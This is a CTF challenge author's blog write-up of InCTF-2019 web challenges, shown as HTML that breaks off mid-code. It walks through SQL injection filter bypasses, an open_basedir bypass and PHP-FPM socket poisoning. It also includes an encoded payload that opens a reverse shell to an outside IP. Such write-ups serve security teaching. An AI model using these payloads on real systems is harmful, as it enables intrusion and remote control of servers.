<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Hey, I am SpyD3r(@TarunkantG) and in this blog I will be discussing all the 5 web challenges that I made for InCTF-2019 and a lot of SQLi and bypassing disable_functions tricks.The first challenge was">
<meta property="og:type" content="article">
<meta property="og:title" content="InCTF-2019 Web challenges writeup">
<meta property="og:url" content="https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/index.html">
<meta property="og:site_name" content="SpyClub">
<meta property="og:description" content="Hey, I am SpyD3r(@TarunkantG) and in this blog I will be discussing all the 5 web challenges that I made for InCTF-2019 and a lot of SQLi and bypassing disable_functions tricks.The first challenge was">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog4.0.png">
<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog4.1.png">
<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog4.2.png">
<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog4.3.png">
<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog4.4.png">
<meta property="article:published_time" content="2019-10-14T18:30:00.000Z">
<meta property="article:modified_time" content="2019-10-15T17:27:54.000Z">
<meta property="article:author" content="SpyD3r">
<meta property="article:tag" content="SSRF">
<meta property="article:tag" content="Writeup">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="InCTF">
<meta property="article:tag" content="Gopherus">
<meta property="article:tag" content="SQL">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="disable_functions">
<meta property="article:tag" content="Code-Review">
<meta property="article:tag" content="Segmentation-Fault">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tarunkant.github.io/images/photos/blog4.0.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>InCTF-2019 Web challenges writeup</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    

<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

<!-- Responsive_1 -->

<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-6813652886953741"
     data-ad-slot="9518537929"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
<script>
      (adsbygoogle = window.adsbygoogle || []).push({
           google_ad_client: "ca-pub-6813652886953741",
           enable_page_level_ads: true
      });
</script>

<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Blogs</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
         
          <li><a href="/resume/resume.pdf">Resume</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/10/26/bypass-disable-functions/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/07/06/segmentation-fault-on-using-phar/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&text=InCTF-2019 Web challenges writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&title=InCTF-2019 Web challenges writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&is_video=false&description=InCTF-2019 Web challenges writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=InCTF-2019 Web challenges writeup&body=Check out this article: https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&title=InCTF-2019 Web challenges writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&title=InCTF-2019 Web challenges writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&title=InCTF-2019 Web challenges writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&title=InCTF-2019 Web challenges writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&name=InCTF-2019 Web challenges writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#GoSQLv2"><span class="toc-number">1.</span> <span class="toc-text">GoSQLv2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-1"><span class="toc-number">1.1.</span> <span class="toc-text">Trick-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-2"><span class="toc-number">1.2.</span> <span class="toc-text">Trick-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-3"><span class="toc-number">1.3.</span> <span class="toc-text">Trick-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-4"><span class="toc-number">1.4.</span> <span class="toc-text">Trick-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-5"><span class="toc-number">1.5.</span> <span class="toc-text">Trick-5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Copy-Cat"><span class="toc-number">2.</span> <span class="toc-text">Copy-Cat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-SQLi"><span class="toc-number">2.1.</span> <span class="toc-text">Bypass SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trcik-6"><span class="toc-number">2.2.</span> <span class="toc-text">Trcik-6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Intended-Step-for-this-stage"><span class="toc-number">2.2.1.</span> <span class="toc-text">Intended Step for this stage:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unintended-Step-for-the-same-stage"><span class="toc-number">2.2.2.</span> <span class="toc-text">Unintended Step for the same stage:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Series"><span class="toc-number">3.</span> <span class="toc-text">PHP Series</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-1"><span class="toc-number">3.1.</span> <span class="toc-text">PHP+1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-1-5"><span class="toc-number">3.2.</span> <span class="toc-text">PHP+1.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-2"><span class="toc-number">3.3.</span> <span class="toc-text">PHP+2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-2-5"><span class="toc-number">3.4.</span> <span class="toc-text">PHP+2.5</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        InCTF-2019 Web challenges writeup
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">SpyClub</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-10-14T18:30:00.000Z" itemprop="datePublished">2019-10-15</time>
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/blog/">blog</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Code-Review/" rel="tag">Code-Review</a>, <a class="tag-link-link" href="/tags/Gopherus/" rel="tag">Gopherus</a>, <a class="tag-link-link" href="/tags/InCTF/" rel="tag">InCTF</a>, <a class="tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/SQL/" rel="tag">SQL</a>, <a class="tag-link-link" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="tag-link-link" href="/tags/Segmentation-Fault/" rel="tag">Segmentation-Fault</a>, <a class="tag-link-link" href="/tags/Writeup/" rel="tag">Writeup</a>, <a class="tag-link-link" href="/tags/disable-functions/" rel="tag">disable_functions</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>Hey, I am SpyD3r(<a target="_blank" rel="noopener" href="https://twitter.com/TarunkantG">@TarunkantG</a>) and in this blog I will be discussing all the 5 web challenges that I made for InCTF-2019 and a lot of SQLi and bypassing disable_functions tricks.<br>The first challenge was Copy-Cat which had 3 solves, second challenge was GoSQLv2 which got 2 solves and the other challenge were based on PHP-internals from which PHP+2 got least solves that is 1.  </p>
<h2 id="GoSQLv2"><a href="#GoSQLv2" class="headerlink" title="GoSQLv2"></a>GoSQLv2</h2><p>This challenge was next version of last year’s GoSQL, you can take look at the writeup <a target="_blank" rel="noopener" href="https://spyclub.tech/2018/10/08/2018-10-08-inctf2018-web-challenge-writeup/">here</a>. This time, this challenge wasn’t that hard because you knew what to do and how to go forward in the challenge, So only thing you need to do exploit <strong>SQLi(2 times)+SSRF+bypass disable_functions</strong> and finally you need to get RCE. Before reading this writeup I suggest you to read last year <a target="_blank" rel="noopener" href="https://spyclub.tech/2018/10/08/2018-10-08-inctf2018-web-challenge-writeup/">writeup</a> first.<br>This challenge is not much different from the last year, only thing is, this time you have to use different SQL tricks to get admin and the different exploit to get database <code>user()</code>. Then same SSRF (using <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a>) then finally need to bypass disable_functions to get RCE.<br>So the first thing I hope you did was <code>diff</code> didn’t you?<br>Yeah, same thing I would have done and that was the right way to do it. So when you <code>diff</code> you will get to know that you can’t use <code>UTF-8</code> charset (So last year trick won’t work ;). And these things which were blocked earlier, this time not:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|-|0|&#x27;|</span><br></pre></td></tr></table></figure><br>And these things which were <strong>not</strong> blocked earlier, this time extra added:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|ad|min|\|0b|0x|having|insert|decode|in|sleep|&gt;|exp|</span><br></pre></td></tr></table></figure><br>So as you can see we can use Single Quote( ‘ ), and for commenting ( - ) is it only used for commenting??</p>
<h3 id="Trick-1"><a href="#Trick-1" class="headerlink" title="Trick-1"></a>Trick-1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> login <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="operator">-</span>sleep(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p><img src="/images/photos/blog4.0.png" alt="a"></p>
<p>This will sleep for number of entries in the database (in this case 12 sec).<br>So that’s how you can dump the database, but here you can’t use <code>sleep</code> because it is also blacklisted. So the main idea is here you can execute SQL commands after putting <code>-</code>.</p>
<p>For getting <code>admin</code> you don’t have to do anything much, just needed to concatenate strings.</p>
<h3 id="Trick-2"><a href="#Trick-2" class="headerlink" title="Trick-2"></a>Trick-2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> login <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;t&#x27;</span> <span class="string">&#x27;a&#x27;</span> <span class="string">&#x27;r&#x27;</span> <span class="string">&#x27;u&#x27;</span> <span class="string">&#x27;n&#x27;</span> <span class="string">&#x27;k&#x27;</span> <span class="string">&#x27;a&#x27;</span> <span class="string">&#x27;n&#x27;</span> <span class="string">&#x27;t&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/images/photos/blog4.1.png" alt="a"></p>
<p>So the final payload I used to get admin was:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=a%27%0a%27d%27%0a%27m%27%0a%27i&#x27;%0a&#x27;n</span><br></pre></td></tr></table></figure></p>
<p>Now you need to find another SQLi to get <code>mysql_user</code> How?<br>By taking the advantage of this:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h4&gt;You are not admin &quot;</span> . <span class="string">&quot;&lt;/h4&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;h4&gt;Having a query problem&quot;</span> . <span class="string">&quot;&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>We will make MySQL to return some time <code>query problem</code> and some time <code>not admin</code>, and doing that we can get <code>mysql_user</code>.  </p>
<h3 id="Trick-3"><a href="#Trick-3" class="headerlink" title="Trick-3"></a>Trick-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> login <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="operator">-</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>)<span class="operator">+</span><span class="number">1</span>);  </span><br><span class="line"># This will <span class="keyword">return</span> <span class="keyword">empty</span> string, <span class="keyword">and</span> hence it will <span class="keyword">return</span> `You <span class="keyword">are</span> <span class="keyword">not</span> admin`</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> login <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="operator">-</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="number">1</span>);  </span><br><span class="line"># This will <span class="keyword">return</span> error</span><br></pre></td></tr></table></figure>
<p><img src="/images/photos/blog4.2.png" alt="a"></p>
<p>Now you know how to bypass that only you need to find alternatives of blacklisted keywords. So instead of <code>=</code> you could have used <code>&lt;</code>, for space <code>%0a</code>.  </p>
<h3 id="Trick-4"><a href="#Trick-4" class="headerlink" title="Trick-4"></a>Trick-4</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;root&#x27;</span><span class="operator">&gt;</span><span class="string">&#x27;a&#x27;</span>;  # Will <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;root&#x27;</span><span class="operator">&gt;</span><span class="string">&#x27;s&#x27;</span>;  # Will <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/photos/blog4.3.png" alt="a"></p>
<p>Like that you can bruteforce and get whole string.</p>
<p>The <strong>full script</strong> for finding the username can be found <a target="_blank" rel="noopener" href="https://github.com/tarunkant/CTF/blob/master/InCTF2019/GoSQLv2/InCTF19-GoSQLv2.py">here</a>.  </p>
<p>There was one unintended, that I wanted to discuss, one of my teammate(<a target="_blank" rel="noopener" href="https://twitter.com/__c3rb3ru5__">@__c3rb3ru5__</a>) found that during challenge <strong>testing phase</strong>(that’s why testing is important ;)). That trick was really mind-fucking.<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="string">&#x27;dm&#x27;</span> <span class="string">&#x27;in&#x27;</span><span class="operator">&gt;</span>(<span class="keyword">user</span>()<span class="operator">&gt;</span><span class="string">&#x27;s&#x27;</span>);</span><br></pre></td></tr></table></figure><br>Here if it true you will get redirected else it will return <code>You are not admin</code>. Using that you can dump the user. That’s why I had to blacklist <code>&gt;</code>, because my payload can also work with <code>&lt;</code> ;)  </p>
<p>Now we go into the second phase of the challenge, that is SSRF + bypass disable_functions to get RCE.  </p>
<p>The first few steps are same as last year, get to know the user_privileges and read the mysql conf file, using that write the shell payload at <code>URL/tmp_hell</code>. These things you can do using <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a>. There you can see that you will not able to execute the <code>system</code> commands, because of disable_function. So next thing you would do is to run <code>phpinfo()</code> and you will see the list of disable_function:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,stream_socket_sendto,stream_socket_client,pcntl_async_signals,error_log,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,imap_open,ld,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir</span><br></pre></td></tr></table></figure><br>and open_basedir:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir = &quot;/var/www/html:/tmp/test1&quot;</span><br></pre></td></tr></table></figure></p>
<h3 id="Trick-5"><a href="#Trick-5" class="headerlink" title="Trick-5"></a>Trick-5</h3><p>Bypass open_basedir using:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_list = array(); $it = new DirectoryIterator(&quot;glob:///va?/ru?/p?p//*&quot;); foreach($it as $f) &#123; $file_list[] = $f-&gt;__toString(); &#125; echo 1234; $it = new DirectoryIterator(&quot;glob:///va?/ru?/p?p/.*&quot;); foreach($it as $f) &#123; $file_list[] = $f-&gt;__toString(); &#125; sort($file_list); foreach($file_list as $f)&#123; echo $f . &quot;\n&quot;; &#125;</span><br></pre></td></tr></table></figure><br>Thanks to <a target="_blank" rel="noopener" href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy">balsn-writeup</a>.</p>
<p>There you can find php-fpm unix socket file which gives you the idea that there is PHP-FPM installed in the server.<br>Now you need to poison the request to the unix socket to get the shell. You can use <code>fsockopen</code> for writing in the socket file. Payload you can generate from <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a>, and make sure you don’t use default file name, use <code>/var/www/html/index.php</code> instead.<br>The payload for getting shell:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fp%20=%20fsockopen(&quot;unix:///var/run/php/php7.0-fpm.sock&quot;,%20-1,%20$errno,%20$errstr,%2030);%20fwrite($fp,base64_decode(&quot;AQEAAQAIAAAAAQAAAAAAAAEEAAEBBQUADxBTRVJWRVJfU09GVFdBUkVnbyAvIGZjZ2ljbGllbnQgCwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8IU0VSVkVSX1BST1RPQ09MSFRUUC8xLjEOA0NPTlRFTlRfTEVOR1RIMTAxDgRSRVFVRVNUX01FVEhPRFBPU1QJS1BIUF9WQUxVRWFsbG93X3VybF9pbmNsdWRlID0gT24KZGlzYWJsZV9mdW5jdGlvbnMgPSAKYXV0b19wcmVwZW5kX2ZpbGUgPSBwaHA6Ly9pbnB1dA8XU0NSSVBUX0ZJTEVOQU1FL3Zhci93d3cvaHRtbC9pbmRleC5waHANAURPQ1VNRU5UX1JPT1QvAAAAAAABBAABAAAAAAEFAAEAZQQAPD9waHAgc3lzdGVtKCdiYXNoIC1jICJzaCAtaSA%2BJiAvZGV2L3RjcC8zLjE1LjI1NS4yNC8xMjM0IDA%2BJjEiJyk7ZGllKCctLS0tLU1hZGUtYnktU3B5RDNyLS0tLS0KJyk7Pz4AAAAA&quot;));</span><br></pre></td></tr></table></figure></p>
<h2 id="Copy-Cat"><a href="#Copy-Cat" class="headerlink" title="Copy-Cat"></a>Copy-Cat</h2><p>This was code-review challenge, the challenge story was: There is a website and admin can only login from his office, for making the admin to work from home too, the website developer also implemented a way so that, the admin can also open the website from any other places.<br>So, the task was to hack that implementation and be admin (However, it is the 1st part of the challenge).  </p>
<h3 id="Bypass-SQLi"><a href="#Bypass-SQLi" class="headerlink" title="Bypass SQLi"></a>Bypass SQLi</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$conn</span>-&gt;real_escape_string(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$tocheck</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$tocheck</span> = trim(escape(<span class="variable">$tocheck</span>));</span><br><span class="line">  <span class="keyword">if</span>(strlen(<span class="variable">$tocheck</span>)&lt;<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;For God Sake, don&#x27;t try to HACK me!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(strlen(<span class="variable">$tocheck</span>)&gt;<span class="number">11</span>)&#123;</span><br><span class="line">    <span class="variable">$tocheck</span> = substr(<span class="variable">$tocheck</span>, <span class="number">0</span>, <span class="number">11</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$tocheck</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Here you have to crack the <code>check</code> function, as this function doing escape and then substr to take first 11 character, you can abuse that to bypass SQL injection.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: 1111111111\</span><br><span class="line">Password: or 1=1-- -</span><br></pre></td></tr></table></figure><br>The escape function will make this username to <code>1111111111\\</code>, but substr will take only 11 character, which made vulnerable this function.<br>After login, you can see the message saying that, you have to proove that you are admin. This time it checks if the user came from <code>127.0.0.1</code> or not!<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$remote_admin</span> = create_function(<span class="string">&quot;&quot;</span>,<span class="string">&#x27;if(isset($_SERVER[&quot;HTTP_I_AM_ADMIN&quot;]))&#123;$_SERVER[&quot;REMOTE_ADDR&quot;] = $_SERVER[&quot;HTTP_I_AM_ADMIN&quot;];&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$random</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function admin_<span class="subst">$random</span>() &#123;&quot;</span></span><br><span class="line">  .<span class="string">&quot;global \$remote_admin; \$remote_admin();&quot;</span></span><br><span class="line">  .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">send(<span class="variable">$random</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;random&#x27;</span>]();</span><br></pre></td></tr></table></figure></p>
<h3 id="Trcik-6"><a href="#Trcik-6" class="headerlink" title="Trcik-6"></a>Trcik-6</h3><p><code>create_function</code> creates <code>lamda</code> function known as Anonymous functions.<br><img src="/images/photos/blog4.4.png" alt="a"></p>
<p>Using this you need to bypass this stage, <a target="_blank" rel="noopener" href="https://github.com/tarunkant/CTF/blob/master/InCTF2019/Copy-Cat/exploit1.py">here</a> you can get the exploit script for doing the same.</p>
<p>Now admin has the functionality to import zip file, and our game server will extract the non-malicious files.  </p>
<h4 id="Intended-Step-for-this-stage"><a href="#Intended-Step-for-this-stage" class="headerlink" title="Intended Step for this stage:"></a>Intended Step for this stage:</h4><figure class="highlight php7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExtractZipFile</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$zip</span> = <span class="keyword">new</span> ZipArchive;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$file</span>) === <span 